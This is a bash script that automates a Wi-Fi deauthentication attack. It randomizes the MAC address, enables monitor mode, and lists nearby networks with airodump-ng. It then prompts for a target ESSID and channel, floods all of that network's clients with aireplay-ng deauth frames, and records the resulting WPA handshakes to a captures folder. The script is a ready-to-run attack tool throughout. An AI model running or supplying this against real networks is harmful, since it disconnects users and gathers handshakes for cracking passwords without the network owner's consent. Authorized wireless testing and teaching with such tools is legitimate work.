#!/bin/bash

# Colors
end_color="$(tput sgr0)"
red_color="$(tput setaf 1)"
yellow_color="$(tput setaf 3)"
blue_color="$(tput setaf 4)"
green_color="$(tput setaf 2)"
purple_color="$(tput setaf 5)"
turquoise_color="$(tput setaf 6)"

# Network Interface
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Colors functions
error_m () {
  echo -e "[${red_color}*${end_color}] $1"
  exit 0
}

warning_m () {
  echo -ne "[${yellow_color}*${end_color}] $1"
}

working_m () {
  echo -e "[${blue_color}*${end_color}] $1"
}

ready_m () {
  echo -e "\n[${green_color}*${end_color}] $1"
}

message_color (){
 echo -en "[${purple_color}*${end_color}] ${turquoise_color}$1${end_color}" 
}

# Exit Manage
trap ctrl_c INT
ctrl_c () {
  kill -9 "$airodump_ng_xterm_PID" 1>&2 2>/dev/null
  kill -9 "$aireplay_ng_xterm_PID" 1>&2 2>/dev/null
  resetInterface
	exit 0
}

isMonitorMode() {
  iw dev | grep monitor >/dev/null
  if [[ "$(echo $?)" -ne 0 ]]; then
    return 1
  fi
}

resetInterface () {
  message_color "Resseting Network\n\n"

  working_m "Setting Managed Interface"
  ip link set $interface down && iw $interface set type managed

  working_m "Restarting Network Services"
  systemctl restart wpa_supplicant.service NetworkManager.service dhcpcd.service

  working_m "Set default MAC\n"
  macchanger -p $interface 
  ip link set $interface up

  ready_m "Done!"
}

startAttack () {
  # Show networks
  xterm -bg black -hold -geometry 180x60 -e "airodump-ng  --wps --manufacturer $interface" 1>&2 2>/dev/null &
  airodump_ng_xterm_PID=$!
  
  # Target
  message_color "ESSID: "
  read -r essid
  message_color "Chanel: "
  read -r channel

  xterm -fg red -bg black -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$essid' $interface && \
    echo -e '\n[${green_color}*${end_color}] Done!'" &
  aireplay_ng_xterm_PID=$!

  mkdir -p "captures/$essid"
  airodump-ng -w "captures/$essid/$essid-ch$channel" --essid "$essid" -c "$channel" "$interface"
	
}

setMonitorMode () {
  # Mac Address
  ifconfig "$interface" down && macchanger -a "$interface" >/dev/null
  ifconfig "$interface" up

  iw dev | grep monitor >/dev/null
  if [[ "$(echo $?)" -ne 0 ]]; then
    message_color "Setting up environment...\n"
    # Monitor Mode
    airmon-ng check kill >/dev/null
    airmon-ng start "$interface" >/dev/null

    iw dev | grep monitor >/dev/null
    if [[ "$(echo $?)" -ne 0 ]]; then
      error_m "Can't set Monitor Mode"
    fi

  fi

  # Show new configurations
  echo -e "${yellow_color}"
  iw dev
  macchanger -s "$interface"
  echo -e "${end_color}"
  sleep 2
}

checkDependencies () {
  clear
  dependencies=(aircrack-ng macchanger xterm)

  message_color "Checking dependencies...\n"

  for program in "${dependencies[@]}"; do

    if [ -x "$(command -v $program)" ]; then
      ready_m "$program"
    else
      error_m "Please install $program"
    fi
    sleep 1
  done
  clear
}

if [ "$(id -u)" == "0" ]; then
  clear
  checkDependencies
  setMonitorMode
  startAttack
  resetInterface
else
  warning_m "Run as root"
fi
